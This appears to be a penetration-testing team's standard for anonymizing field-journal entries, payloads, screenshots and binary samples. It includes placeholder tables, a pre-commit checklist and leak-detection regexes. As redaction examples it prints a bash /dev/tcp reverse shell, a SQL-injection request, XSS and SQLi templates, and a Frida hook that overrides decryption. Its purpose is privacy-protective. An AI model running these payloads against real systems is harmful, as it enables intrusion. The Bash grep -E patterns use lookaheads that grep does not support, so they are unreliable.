# Field-Journal Anonymization Standard

> You **MUST** sanitize sensitive target data when writing `field-journal` entries, submitting pull requests, sharing payloads, or publishing external reports. Adapted from the PentAGI multi-agent anonymization protocol, this standard **preserves reusable technical value without exposing real targets**.

## Master Placeholder Table

### Network & Hosts

| Type | Placeholder | Applicable Scenario |
|------|-------------|---------------------|
| Target IP | `{target_ip}` | Primary penetration testing target host |
| Victim IP | `{victim_ip}` | Next hop during internal lateral movement |
| Remote Host | `{remote_host}` | Generic remote address |
| Server IP | `{server_ip}` | C2 / relay / public callback listener |
| Callback Domain | `{callback_domain}` | OOB / reverse callback |
| Target Domain | `{target_domain}` | Web / email target |
| Victim Domain | `{victim_domain}` | Internal Active Directory / enterprise domain |
| Custom Port | `{port}` | Non-standard service port |
| Standard Ports | Keep original value | Keep 80 / 443 / 22 / 445 / 3389 etc. for reusability |

### Credentials & Secrets

| Type | Placeholder |
|------|-------------|
| Username | `{username}` |
| Password | `{password}` |
| Hash Value | `{hash}` |
| Session Token | `{token}` |
| API Key | `{api_key}` |
| Cookie | `{cookie}` |
| Bearer Token | `{bearer_token}` |

### URLs & Endpoints

| Type | Placeholder |
|------|-------------|
| Generic URL | `{url}` |
| API Endpoint | `{api_endpoint}` |
| Callback URL | `{callback_url}` |
| Upload Endpoint | `{upload_endpoint}` |
| Login Endpoint | `{login_endpoint}` |

### File Paths

| Type | Placeholder |
|------|-------------|
| Installation Directory | `{install_dir}` |
| Configuration File | `{config_path}` |
| Web Root | `{webroot}` |
| Upload Directory | `{upload_dir}` |
| Log Path | `{log_path}` |

### Business Identifiers

| Type | Placeholder |
|------|-------------|
| Real Name | `{user_name}` |
| Email Address | `{user_email}` |
| Phone Number | `{phone}` |
| Employee ID | `{employee_id}` |
| Order ID | `{order_id}` |
| UUID | `{uuid}` |

## Items That Must NOT Be Anonymized

To preserve technical reusability, **do not replace** the following:

- CVE identifiers (`CVE-2024-1234`)
- Tool names and versions (`sqlmap 1.7.10`)
- Standard ports (80 / 443 / 445 / 1433 / 3306, etc.)
- Public OS versions (`Windows Server 2019`, `Ubuntu 22.04`)
- Generic payload templates (`<script>alert(1)</script>`, `' OR 1=1--`)
- Library and function names (`OpenSSL`, `memcpy`, `strncpy`)
- Protocol and field names (`Kerberos AS-REQ`, `LDAP bind`)

## Context Preservation Principle

Preserve **semantic structure** during replacement so readers understand the role of each value:

```python
# Bad: Replacing everything with X destroys semantic meaning
target = "X"
url = "X/X"

# Bad: Overly generic placeholders
target = "{target}"
url = "{url}"

# Good: Context-preserving placeholders
target_ip = "{target_ip}"              # 192.168.10.50
target_url = "{target_url}/admin"      # https://corp.example.com/admin
admin_token = "{admin_session_token}"  # eyJhbGciOi...
```

## Payload Anonymization

### Web Payload

```text
Original:  GET /api/v2/users/8821/orders?id=1' OR 1=1-- HTTP/1.1
           Host: shop.victim-corp.example
           Cookie: PHPSESSID=abcdef123456

Sanitized: GET /api/v2/users/{user_id}/orders?id=1' OR 1=1-- HTTP/1.1
           Host: {target_domain}
           Cookie: PHPSESSID={session_id}
```

### Shell Payload

```bash
# Original
bash -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

# Sanitized
bash -c 'bash -i >& /dev/tcp/{callback_ip}/{callback_port} 0>&1'
```

### Frida Hook Script

```javascript
// Original
Java.use("com.victim.app.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("AAAAAAAAAAAAAAAAAAAAAA==");
    return result;
};

// Sanitized
Java.use("{target_package}.Crypto").decrypt.implementation = function(s) {
    var result = this.decrypt("{sample_ciphertext}");
    return result;
};
```

## Binary Sample Anonymization

### Hashes

Record the SHA-256 hash only; **do not attach the raw binary**. If sample sharing is required:

- Reference public repositories such as VirusTotal or MalwareBazaar
- Link to existing public analyses of the same SHA-256 hash

### Strings & Symbols

```c
// Original
char *secret = "Bearer eyJhbGciOiJIUzI1NiJ9...";
const char *api = "https://api.target-corp.com/v3/auth";

// Sanitized
char *secret = "Bearer {hardcoded_jwt}";
const char *api = "{api_endpoint}";
```

## Screenshot Anonymization

- Redact with solid black or pixelation: usernames, emails, phone numbers, order IDs, personal names
- Expose only the URL path structure in address bars (keep path, redact host) or replace entirely
- Mask internal IP ranges to the first two octets: `10.0.x.x` instead of `10.0.10.50`
- Redact corporate logos, watermarks, and brand identifiers

## CTF Exceptions

CTF challenge descriptions, lab hostnames, and flag formats are **generally non-sensitive** (public challenges), except:

- Privately hosted internal ranges must be treated as real environments
- Active competition flags must not be disclosed before the competition ends
- Unreleased third-party writeups must not be copied into `field-journal`

## Automated Leak Detection Snippet

Run these regular expressions after authoring a `field-journal` entry to catch unsanitized values:

```powershell
# Windows PowerShell
$file = "field-journal/2026-05-15_xxx.md"
$content = Get-Content $file -Raw

# Public IPv4
[regex]::Matches($content, "\b(?!10\.)(?!127\.)(?!172\.(1[6-9]|2[0-9]|3[01])\.)(?!192\.168\.)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b") | ForEach-Object { Write-Host "Public IP: $($_.Value)" }

# Email
[regex]::Matches($content, "[\w\.\-]+@[\w\.\-]+\.\w+") | ForEach-Object { Write-Host "Email: $($_.Value)" }

# Phone number
[regex]::Matches($content, "\b1[3-9]\d{9}\b") | ForEach-Object { Write-Host "Phone: $($_.Value)" }

# JWT
[regex]::Matches($content, "eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}") | ForEach-Object { Write-Host "JWT: $($_.Value)" }
```

```bash
# Bash / Linux equivalent
grep -nE '\b(?!10\.|127\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d{1,3}(\.\d{1,3}){3}\b' file.md
grep -nE '[\w\.\-]+@[\w\.\-]+\.\w+' file.md
grep -nE '\b1[3-9][0-9]{9}\b' file.md
```

## Reading Sanitized Documentation

When reading sanitized `field-journal` entries or writeups, **never replace `{target_ip}` or similar placeholders with your own live target values and commit them back**. Keep placeholders intact in shared documentation.

## Mandatory Field-Journal Pre-Commit Checklist

Verify every item below before committing a `field-journal` entry:

```text
□ No public IPs (except public CDNs / documented public services)
□ No real domains (except example.com or RFC 2606 demonstration domains)
□ No real credentials, tokens, or hashes (replaced with {placeholder})
□ No personal names, employee IDs, or emails visible in screenshots
□ No raw sample binaries committed (SHA-256 hashes only)
□ All JWTs, OAuth codes, and API keys replaced
□ Internal IP ranges masked to the first two octets (10.0.x.x)
□ Target-specific payload parameters replaced with generic placeholders
□ Cookies and session IDs replaced
```

Include this checklist at the end of `skill://re-reverse-engineering/support/field-journal/_template.md`.
